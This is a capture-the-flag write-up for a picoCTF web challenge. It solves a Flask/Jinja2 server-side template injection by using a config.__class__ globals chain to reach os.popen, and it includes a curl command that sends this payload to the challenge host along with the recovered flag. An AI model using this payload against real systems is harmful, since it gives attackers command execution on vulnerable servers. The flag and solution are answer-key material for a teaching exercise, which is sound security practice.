---
title: "SSTI1"
date: "2026-05-28"
category: "web"
description: "Jinja2 Server-Side Template Injection — arbitrary command execution via config.__class__ chain reads flag."
---

## 🎯 Summary

Flask/Jinja2 app reflects user input into a template. Unsanitized `{{ }}` expressions execute server-side. Classic SSTI chain via `config.__class__.__init__.__globals__['os'].popen()` reads the flag file.

## 🧩 Solution

1. Confirm SSTI: `{{7*7}}` returns `49`.
2. Reach `os.popen` through Flask's `config` object:
   ```
   {{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
   ```

```bash
curl -X POST "http://rescued-float.picoctf.net:55110/" \
  --data-urlencode "content={{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}"
```

## 🚩 Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```
